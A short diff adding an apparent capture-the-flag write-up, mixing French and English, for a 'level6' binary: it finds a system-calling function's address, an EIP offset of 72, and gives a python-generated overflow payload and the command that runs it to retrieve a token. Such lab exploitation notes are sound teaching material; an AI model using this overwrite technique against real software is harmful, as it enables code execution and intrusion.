@@ -1,0 +1,25 @@
+n = 08048454	# addresse of n (system)
+
+m = 08048468	# addresse of m (puts)
+
+we have 2 call of malloc function, 1 call strcpy and a call to m function.
+
+"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Acaaaa\x54\x84\x04\x08"
+
+Ici nous avons un binaire qui ne fait pas apelle a la fonction n.
+
+Nous devons juste ecraser EIP par l'adresse de la fonction n.
+
+On calcul ou ce trouve EIP.
+
+L'outil nous dit que c'est a l'offset 72
+
+On remplie notre buffer avec des valeurs random, + 4 pour ecraser EBP, et l'adresse de notre fonction a call.
+
+Creation de notre payload :
+python -c 'print("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3\x54\x84\x04\x08")' > /tmp/payload
+
+execution de notre rogramme avec notre payload :
+./level6 `cat /tmp/payload`
+
+Nous avons notre token.
